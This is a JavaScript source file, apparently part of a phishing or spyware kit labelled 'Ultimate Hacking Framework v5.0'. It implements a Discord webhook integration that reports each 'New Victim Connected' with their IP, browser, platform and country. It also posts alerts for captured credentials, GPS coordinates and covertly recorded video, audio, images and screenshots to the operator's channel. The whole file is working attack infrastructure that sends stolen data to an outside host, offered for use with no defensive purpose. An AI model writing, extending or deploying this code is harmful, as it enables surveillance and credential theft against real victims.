const axios = require('axios');

class DiscordIntegration {
    constructor(webhookUrl) {
        this.webhookUrl = webhookUrl;
        this.colors = {
            info: 0x3498db,
            success: 0x2ecc71, 
            warning: 0xf39c12,
            error: 0xe74c3c,
            critical: 0x9b59b6
        };
    }

    async sendVictimNotification(victimData) {
        const embed = {
            title: "🎯 New Victim Connected",
            color: this.colors.success,
            fields: [
                {
                    name: "Victim ID",
                    value: `\`${victimData.id}\``,
                    inline: true
                },
                {
                    name: "Platform",
                    value: victimData.platform,
                    inline: true
                },
                {
                    name: "Browser",
                    value: victimData.browser,
                    inline: true
                },
                {
                    name: "Country",
                    value: victimData.country,
                    inline: true
                },
                {
                    name: "IP Address",
                    value: `\`${victimData.ip}\``,
                    inline: true
                },
                {
                    name: "User Agent",
                    value: `\`\`\`${victimData.userAgent.substring(0, 100)}...\`\`\``
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Ultimate Hacking Framework v5.0"
            }
        };

        return this.sendEmbed(embed);
    }

    async sendDataCaptureNotification(victimId, dataType, data) {
        const embed = {
            title: this.getDataTitle(dataType),
            color: this.getDataColor(dataType),
            fields: [
                {
                    name: "Victim ID",
                    value: `\`${victimId}\``,
                    inline: true
                },
                {
                    name: "Data Type",
                    value: dataType,
                    inline: true
                },
                {
                    name: "Timestamp",
                    value: new Date().toLocaleString(),
                    inline: true
                }
            ],
            timestamp: new Date().toISOString()
        };

        // Add data-specific fields
        this.addDataFields(embed, dataType, data);

        return this.sendEmbed(embed);
    }

    async sendMediaNotification(victimId, mediaType, metadata) {
        const embed = {
            title: this.getMediaTitle(mediaType),
            color: this.colors.info,
            fields: [
                {
                    name: "Victim ID",
                    value: `\`${victimId}\``,
                    inline: true
                },
                {
                    name: "Media Type",
                    value: mediaType,
                    inline: true
                },
                {
                    name: "File Size",
                    value: this.formatFileSize(metadata.size),
                    inline: true
                },
                {
                    name: "Duration",
                    value: metadata.duration ? `${metadata.duration}ms` : 'N/A',
                    inline: true
                }
            ],
            timestamp: new Date().toISOString()
        };

        return this.sendEmbed(embed);
    }

    async sendEmbed(embed) {
        try {
            const response = await axios.post(this.webhookUrl, {
                embeds: [embed]
            });
            
            return { success: true, messageId: response.data.id };
        } catch (error) {
            console.error('Discord webhook error:', error.message);
            return { success: false, error: error.message };
        }
    }

    getDataTitle(dataType) {
        const titles = {
            'location': '📍 Location Data Captured',
            'credentials': '🔑 Credentials Captured', 
            'media': '🎥 Media Access Granted',
            'system_info': '💻 System Information',
            'scan_complete': '✅ Scan Completed',
            'error': '❌ Error Occurred'
        };
        
        return titles[dataType] || '📊 Data Captured';
    }

    getDataColor(dataType) {
        const colors = {
            'location': this.colors.info,
            'credentials': this.colors.critical,
            'media': this.colors.warning,
            'system_info': this.colors.info,
            'scan_complete': this.colors.success,
            'error': this.colors.error
        };
        
        return colors[dataType] || this.colors.info;
    }

    addDataFields(embed, dataType, data) {
        switch(dataType) {
            case 'location':
                embed.fields.push(
                    {
                        name: "Coordinates",
                        value: `**Lat:** ${data.coordinates.latitude}\n**Lng:** ${data.coordinates.longitude}`,
                        inline: true
                    },
                    {
                        name: "Accuracy", 
                        value: `${data.coordinates.accuracy}m`,
                        inline: true
                    }
                );
                break;
                
            case 'credentials':
                embed.fields.push(
                    {
                        name: "Username/Email",
                        value: `\`${data.username || data.email}\``,
                        inline: true
                    },
                    {
                        name: "Password",
                        value: `\`${'*'.repeat(data.password?.length || 0)}\``,
                        inline: true
                    }
                );
                break;
        }
    }

    getMediaTitle(mediaType) {
        const titles = {
            'video': '🎥 Video Recording Captured',
            'audio': '🎤 Audio Recording Captured', 
            'image': '📸 Image Captured',
            'screenshot': '🖥️ Screenshot Captured'
        };
        
        return titles[mediaType] || '📁 Media File Captured';
    }

    formatFileSize(bytes) {
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        if (bytes === 0) return '0 Bytes';
        const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
        return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
    }
}

module.exports = DiscordIntegration;
